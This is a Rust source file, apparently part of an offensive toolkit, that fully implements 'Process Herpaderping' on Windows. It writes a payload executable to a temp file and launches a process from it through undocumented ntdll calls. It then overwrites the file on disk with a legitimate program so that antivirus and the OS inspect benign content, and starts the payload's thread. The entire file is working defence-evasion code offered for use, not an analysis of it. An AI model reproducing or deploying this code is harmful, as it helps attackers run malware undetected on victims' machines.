use std::ffi::CString;
use std::path::Path;

use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FlushFileBuffers, SetEndOfFile, SetFilePointer, WriteFile, FILE_ATTRIBUTE_NORMAL,
    FILE_BEGIN, FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows::Win32::System::Threading::{GetCurrentProcess, GetProcessId, TerminateProcess};

use crate::error::MiscError;

/// Process Herpaderping: execute a PE payload while making the on-disk file look legitimate.
///
/// Algorithm:
/// 1. Read payload PE into memory, validate PE32+ (64-bit), extract entry point RVA
/// 2. Read legitimate PE (used to overwrite temp file later)
/// 3. Create temp file in %TEMP%, open with GENERIC_READ|GENERIC_WRITE and full sharing
/// 4. Write payload bytes to temp file via WriteFile + FlushFileBuffers + SetEndOfFile
/// 5. Create SEC_IMAGE section from temp file via NtCreateSection
/// 6. Create process from section via NtCreateProcessEx
/// 7. **Overwrite** temp file with legitimate PE content (the "herpaderp") — AV/OS sees legit PE on disk
/// 8. Close file handles
/// 9. Set up PEB, process parameters, environment block for the new process
/// 10. Create initial thread via NtCreateThreadEx at payload's entry point
///
/// Returns the PID of the herpaderped process on success.
///
/// # Arguments
/// * `pe_path` - Path to the payload PE executable (64-bit)
/// * `pe_args` - Optional command-line arguments for the payload
/// * `legit_img` - Path to a legitimate PE whose content will replace the temp file on disk
pub fn herpaderp_process(
    pe_path: &str,
    pe_args: Option<&str>,
    legit_img: &str,
) -> Result<u32, MiscError> {
    // Validate files exist
    if !Path::new(pe_path).exists() {
        return Err(MiscError::FileNotFound(pe_path.to_string()));
    }
    if !Path::new(legit_img).exists() {
        return Err(MiscError::FileNotFound(legit_img.to_string()));
    }

    // Read payload PE
    let payload_data = std::fs::read(pe_path)
        .map_err(|_| MiscError::FileReadFailed(pe_path.to_string()))?;

    // Read legitimate PE (for overwrite)
    let legit_data = std::fs::read(legit_img)
        .map_err(|_| MiscError::FileReadFailed(legit_img.to_string()))?;

    // Validate payload PE header
    if payload_data.len() < 64 {
        return Err(MiscError::InvalidPE(
            "File too small for DOS header".into(),
        ));
    }
    let dos_magic = u16::from_le_bytes([payload_data[0], payload_data[1]]);
    if dos_magic != 0x5A4D {
        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
    }
    let pe_offset =
        u32::from_le_bytes([payload_data[60], payload_data[61], payload_data[62], payload_data[63]])
            as usize;
    if payload_data.len() < pe_offset + 4 {
        return Err(MiscError::InvalidPE(
            "File too small for PE signature".into(),
        ));
    }
    let pe_sig = u32::from_le_bytes([
        payload_data[pe_offset],
        payload_data[pe_offset + 1],
        payload_data[pe_offset + 2],
        payload_data[pe_offset + 3],
    ]);
    if pe_sig != 0x00004550 {
        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
    }

    // Check PE32+ (64-bit)
    let coff_offset = pe_offset + 4;
    if payload_data.len() < coff_offset + 20 {
        return Err(MiscError::InvalidPE(
            "File too small for COFF header".into(),
        ));
    }
    let opt_offset = coff_offset + 20;
    if payload_data.len() < opt_offset + 20 {
        return Err(MiscError::InvalidPE(
            "File too small for optional header".into(),
        ));
    }
    let opt_magic = u16::from_le_bytes([payload_data[opt_offset], payload_data[opt_offset + 1]]);
    if opt_magic != 0x20b {
        return Err(MiscError::ArchMismatch(
            "Only PE32+ (64-bit) executables are supported for herpaderping".into(),
        ));
    }

    // Get entry point RVA
    let entry_point_rva = u32::from_le_bytes([
        payload_data[opt_offset + 16],
        payload_data[opt_offset + 17],
        payload_data[opt_offset + 18],
        payload_data[opt_offset + 19],
    ]) as u64;

    if entry_point_rva == 0 {
        return Err(MiscError::InvalidPE("Entry point RVA is zero".into()));
    }

    unsafe {
        // Resolve NT functions from ntdll
        let ntdll = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|_| MiscError::HerpaderpFailed("Failed to get ntdll.dll handle".into()))?;

        let get_proc = |name: &str| -> Result<*const (), MiscError> {
            let cname = CString::new(name).unwrap();
            GetProcAddress(ntdll, PCSTR(cname.as_ptr() as *const u8))
                .map(|p| p as *const ())
                .ok_or_else(|| {
                    MiscError::HerpaderpFailed(format!("Failed to resolve {}", name))
                })
        };

        // ---- NT API struct definitions ----

        #[repr(C)]
        struct UnicodeString {
            length: u16,
            maximum_length: u16,
            buffer: *mut u16,
        }

        impl UnicodeString {
            fn from_wide(wide: &[u16]) -> Self {
                let byte_len = ((wide.len().saturating_sub(1)) * 2) as u16;
                Self {
                    length: byte_len,
                    maximum_length: byte_len + 2,
                    buffer: wide.as_ptr() as *mut u16,
                }
            }
        }

        // ---- Function type definitions ----

        type NtCreateSectionFn = unsafe extern "system" fn(
            *mut HANDLE,
            u32,
            *mut std::ffi::c_void,
            *mut i64,
            u32,
            u32,
            HANDLE,
        ) -> i32;

        type NtCreateProcessExFn = unsafe extern "system" fn(
            *mut HANDLE,
            u32,
            *mut std::ffi::c_void,
            HANDLE,
            u32,
            HANDLE,
            HANDLE,
            HANDLE,
            u8,
        ) -> i32;

        type NtQueryInformationProcessFn = unsafe extern "system" fn(
            HANDLE,
            u32,
            *mut std::ffi::c_void,
            u32,
            *mut u32,
        ) -> i32;

        type NtReadVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE,
            *const std::ffi::c_void,
            *mut std::ffi::c_void,
            usize,
            *mut usize,
        ) -> i32;

        type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE,
            *mut *mut std::ffi::c_void,
            usize,
            *mut usize,
            u32,
            u32,
        ) -> i32;

        type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE,
            *mut std::ffi::c_void,
            *const std::ffi::c_void,
            usize,
            *mut usize,
        ) -> i32;

        type RtlCreateProcessParametersExFn = unsafe extern "system" fn(
            *mut *mut std::ffi::c_void,
            *mut UnicodeString,
            *mut UnicodeString,
            *mut UnicodeString,
            *mut UnicodeString,
            *mut std::ffi::c_void,
            *mut UnicodeString,
            *mut UnicodeString,
            *mut UnicodeString,
            *mut UnicodeString,
            u32,
        ) -> i32;

        type RtlDestroyProcessParametersFn =
            unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut HANDLE,
            u32,
            *mut std::ffi::c_void,
            HANDLE,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut std::ffi::c_void,
        ) -> i32;

        type CreateEnvironmentBlockFn =
            unsafe extern "system" fn(*mut *mut std::ffi::c_void, HANDLE, i32) -> i32;

        type DestroyEnvironmentBlockFn =
            unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        // ---- Resolve all functions ----
        let nt_create_section: NtCreateSectionFn =
            std::mem::transmute(get_proc("NtCreateSection")?);
        let nt_create_process_ex: NtCreateProcessExFn =
            std::mem::transmute(get_proc("NtCreateProcessEx")?);
        let nt_query_info_process: NtQueryInformationProcessFn =
            std::mem::transmute(get_proc("NtQueryInformationProcess")?);
        let nt_read_virtual_memory: NtReadVirtualMemoryFn =
            std::mem::transmute(get_proc("NtReadVirtualMemory")?);
        let nt_allocate_virtual_memory: NtAllocateVirtualMemoryFn =
            std::mem::transmute(get_proc("NtAllocateVirtualMemory")?);
        let nt_write_virtual_memory: NtWriteVirtualMemoryFn =
            std::mem::transmute(get_proc("NtWriteVirtualMemory")?);
        let rtl_create_process_parameters_ex: RtlCreateProcessParametersExFn =
            std::mem::transmute(get_proc("RtlCreateProcessParametersEx")?);
        let rtl_destroy_process_parameters: RtlDestroyProcessParametersFn =
            std::mem::transmute(get_proc("RtlDestroyProcessParameters")?);
        let nt_create_thread_ex: NtCreateThreadExFn =
            std::mem::transmute(get_proc("NtCreateThreadEx")?);

        // Resolve userenv.dll functions
        let userenv = LoadLibraryA(PCSTR(b"userenv.dll\0".as_ptr()))
            .map_err(|_| MiscError::HerpaderpFailed("Failed to load userenv.dll".into()))?;
        let create_environment_block: CreateEnvironmentBlockFn = std::mem::transmute(
            GetProcAddress(userenv, PCSTR(b"CreateEnvironmentBlock\0".as_ptr())).ok_or_else(
                || MiscError::HerpaderpFailed("Failed to resolve CreateEnvironmentBlock".into()),
            )?,
        );
        let destroy_environment_block: DestroyEnvironmentBlockFn = std::mem::transmute(
            GetProcAddress(userenv, PCSTR(b"DestroyEnvironmentBlock\0".as_ptr())).ok_or_else(
                || MiscError::HerpaderpFailed("Failed to resolve DestroyEnvironmentBlock".into()),
            )?,
        );

        // ==== Step 1: Create temp file ====
        let unique_id = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let temp_filename = format!("PH_{:X}.tmp", unique_id);
        let temp_path = std::env::temp_dir().join(&temp_filename);
        let temp_path_str = temp_path.to_string_lossy().to_string();

        // Create empty temp file first
        std::fs::File::create(&temp_path)
            .map_err(|_| MiscError::HerpaderpFailed("Failed to create temp file".into()))?;

        // Open with CreateFileW for GENERIC_READ | GENERIC_WRITE with full sharing
        let tmp_wide: Vec<u16> = temp_path_str
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let h_tmp_file = CreateFileW(
            windows::core::PCWSTR(tmp_wide.as_ptr()),
            0x80000000 | 0x40000000, // GENERIC_READ | GENERIC_WRITE
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|_| MiscError::HerpaderpFailed("CreateFileW failed for temp file".into()))?;

        // ==== Step 2: Write payload PE to temp file ====
        let mut bytes_written: u32 = 0;
        if WriteFile(
            h_tmp_file,
            Some(&payload_data),
            Some(&mut bytes_written),
            None,
        )
        .is_err()
        {
            let _ = CloseHandle(h_tmp_file);
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::HerpaderpFailed(
                "WriteFile failed for payload".into(),
            ));
        }

        let _ = FlushFileBuffers(h_tmp_file);
        let _ = SetEndOfFile(h_tmp_file);

        // ==== Step 3: Create SEC_IMAGE section from temp file ====
        let mut section_handle = HANDLE::default();
        let status = nt_create_section(
            &mut section_handle,
            0xF001F, // SECTION_ALL_ACCESS
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x02,      // PAGE_READONLY
            0x1000000, // SEC_IMAGE
            h_tmp_file,
        );

        if status != 0 {
            let _ = CloseHandle(h_tmp_file);
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::HerpaderpFailed(format!(
                "NtCreateSection failed with status 0x{:08X}",
                status
            )));
        }

        // ==== Step 4: Create process from section ====
        let mut process_handle = HANDLE::default();
        let status = nt_create_process_ex(
            &mut process_handle,
            0x001FFFFF, // PROCESS_ALL_ACCESS
            std::ptr::null_mut(),
            GetCurrentProcess(),
            4, // PROCESS_CREATE_FLAGS_INHERIT_HANDLES
            section_handle,
            HANDLE::default(), // DebugPort
            HANDLE::default(), // ExceptionPort
            0,                 // InJob = FALSE
        );

        let _ = CloseHandle(section_handle);

        if status != 0 {
            let _ = CloseHandle(h_tmp_file);
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::HerpaderpFailed(format!(
                "NtCreateProcessEx failed with status 0x{:08X}",
                status
            )));
        }

        let pid = GetProcessId(process_handle);

        let cleanup = |ph: HANDLE| {
            let _ = TerminateProcess(ph, 1);
            let _ = CloseHandle(ph);
        };

        // ==== Step 5: Overwrite temp file with legitimate PE (the "herpaderp") ====
        // Reset file pointer to beginning
        SetFilePointer(h_tmp_file, 0, None, FILE_BEGIN);

        // Write legit PE content over the payload
        let mut legit_written: u32 = 0;
        if WriteFile(
            h_tmp_file,
            Some(&legit_data),
            Some(&mut legit_written),
            None,
        )
        .is_err()
        {
            let _ = CloseHandle(h_tmp_file);
            cleanup(process_handle);
            return Err(MiscError::HerpaderpFailed(
                "WriteFile failed for legit overwrite".into(),
            ));
        }

        let _ = FlushFileBuffers(h_tmp_file);
        let _ = SetEndOfFile(h_tmp_file); // Truncate to legit PE size

        // Close file handles — the on-disk file now contains the legit PE
        let _ = CloseHandle(h_tmp_file);

        // ==== Step 6: Initialize process parameters ====
        // Build command line: "tmp_file_path [args]"
        let command_line_str = match pe_args {
            Some(args) if !args.is_empty() => format!("{} {}", temp_path_str, args),
            _ => temp_path_str.clone(),
        };

        // Image path = just the tmp file path (no args)
        let image_path_wide: Vec<u16> = temp_path_str
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let command_line_wide: Vec<u16> = command_line_str
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        // Current directory = parent of temp file
        let temp_dir = temp_path
            .parent()
            .unwrap_or(Path::new("C:\\"))
            .to_string_lossy()
            .to_string();
        let current_dir_wide: Vec<u16> = temp_dir
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let mut us_image_path = UnicodeString::from_wide(&image_path_wide);
        let mut us_command_line = UnicodeString::from_wide(&command_line_wide);
        let mut us_current_dir = UnicodeString::from_wide(&current_dir_wide);

        // Create environment block
        let mut environment: *mut std::ffi::c_void = std::ptr::null_mut();
        let env_result = create_environment_block(
            &mut environment,
            HANDLE::default(), // NULL token = current user
            1,                 // bInherit = TRUE
        );

        if env_result == 0 || environment.is_null() {
            cleanup(process_handle);
            return Err(MiscError::HerpaderpFailed(
                "CreateEnvironmentBlock failed".into(),
            ));
        }

        // Create process parameters with RTL_USER_PROC_PARAMS_NORMALIZED
        let mut process_params: *mut std::ffi::c_void = std::ptr::null_mut();
        let status = rtl_create_process_parameters_ex(
            &mut process_params,
            &mut us_image_path,
            std::ptr::null_mut(), // DllPath
            &mut us_current_dir,
            &mut us_command_line,
            environment,
            std::ptr::null_mut(), // WindowTitle
            std::ptr::null_mut(), // DesktopInfo
            std::ptr::null_mut(), // ShellInfo
            std::ptr::null_mut(), // RuntimeData
            1,                    // RTL_USER_PROC_PARAMS_NORMALIZED
        );

        if status != 0 || process_params.is_null() {
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::HerpaderpFailed(format!(
                "RtlCreateProcessParametersEx failed with status 0x{:08X}",
                status
            )));
        }

        // Query PEB address via NtQueryInformationProcess
        let mut pbi = [0u8; 48]; // sizeof(PROCESS_BASIC_INFORMATION) on x64
        let mut return_length: u32 = 0;
        let status = nt_query_info_process(
            process_handle,
            0, // ProcessBasicInformation
            pbi.as_mut_ptr() as *mut _,
            48,
            &mut return_length,
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::NtQueryFailed);
        }

        // PebBaseAddress at offset 0x08 in PROCESS_BASIC_INFORMATION (x64)
        let peb_address = u64::from_le_bytes([
            pbi[8], pbi[9], pbi[10], pbi[11], pbi[12], pbi[13], pbi[14], pbi[15],
        ]) as usize;

        // Read PEB to get ImageBase (offset 0x10)
        let mut peb_data = [0u8; 0x30];
        let mut bytes_read: usize = 0;
        let status = nt_read_virtual_memory(
            process_handle,
            peb_address as *const _,
            peb_data.as_mut_ptr() as *mut _,
            peb_data.len(),
            &mut bytes_read,
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::PebReadFailed);
        }

        let image_base = u64::from_le_bytes([
            peb_data[0x10],
            peb_data[0x11],
            peb_data[0x12],
            peb_data[0x13],
            peb_data[0x14],
            peb_data[0x15],
            peb_data[0x16],
            peb_data[0x17],
        ]) as usize;

        // Calculate memory range for params + environment
        let params_ptr = process_params as *const u8;
        let params_length =
            std::ptr::read_unaligned(params_ptr.add(0x04) as *const u32) as usize;
        let env_ptr = std::ptr::read_unaligned(params_ptr.add(0x80) as *const usize);
        let env_size = std::ptr::read_unaligned(params_ptr.add(0x3F0) as *const usize);

        let params_base = process_params as usize;
        let params_end = params_base + params_length;

        let mut env_and_params_base = params_base;
        let mut env_and_params_end = params_end;

        if env_ptr != 0 {
            if params_base > env_ptr {
                env_and_params_base = env_ptr;
            }
            if env_ptr + env_size > env_and_params_end {
                env_and_params_end = env_ptr + env_size;
            }
        }

        let mut total_size = env_and_params_end - env_and_params_base;

        // Allocate memory in remote process at the params address
        let mut remote_base = process_params;
        let status = nt_allocate_virtual_memory(
            process_handle,
            &mut remote_base,
            0,
            &mut total_size,
            0x00001000 | 0x00002000, // MEM_COMMIT | MEM_RESERVE
            0x04,                    // PAGE_READWRITE
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::AllocFailed);
        }

        // Write process parameters
        let mut bw: usize = 0;
        let status = nt_write_virtual_memory(
            process_handle,
            process_params,
            process_params as *const _,
            params_length,
            &mut bw,
        );

        if status != 0 {
            let _ = rtl_destroy_process_parameters(process_params);
            destroy_environment_block(environment);
            cleanup(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Write environment block
        if env_ptr != 0 {
            let status = nt_write_virtual_memory(
                process_handle,
                env_ptr as *mut _,
                env_ptr as *const _,
                env_size,
                &mut bw,
            );

            if status != 0 {
                let _ = rtl_destroy_process_parameters(process_params);
                destroy_environment_block(environment);
                cleanup(process_handle);
                return Err(MiscError::WriteFailed);
            }
        }

        // Update PEB.ProcessParameters (offset 0x20) to point to remote params
        let peb_process_params_addr = (peb_address + 0x20) as *mut std::ffi::c_void;
        let params_addr = process_params as usize;
        let status = nt_write_virtual_memory(
            process_handle,
            peb_process_params_addr,
            &params_addr as *const _ as *const _,
            std::mem::size_of::<usize>(),
            &mut bw,
        );

        // Clean up local resources
        let _ = rtl_destroy_process_parameters(process_params);
        destroy_environment_block(environment);

        if status != 0 {
            cleanup(process_handle);
            return Err(MiscError::PebReadFailed);
        }

        // ==== Step 7: Create initial thread ====
        let entry_point_addr = (image_base as u64 + entry_point_rva) as *const std::ffi::c_void;

        let mut thread_handle = HANDLE::default();
        let status = nt_create_thread_ex(
            &mut thread_handle,
            0x1FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            process_handle,
            entry_point_addr,
            std::ptr::null(),
            0,    // Start immediately
            0,    // ZeroBits
            0,    // StackSize
            0,    // MaximumStackSize
            std::ptr::null_mut(),
        );

        if status != 0 {
            cleanup(process_handle);
            return Err(MiscError::HerpaderpFailed(format!(
                "NtCreateThreadEx failed with status 0x{:08X}",
                status
            )));
        }

        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        Ok(pid)
    }
}
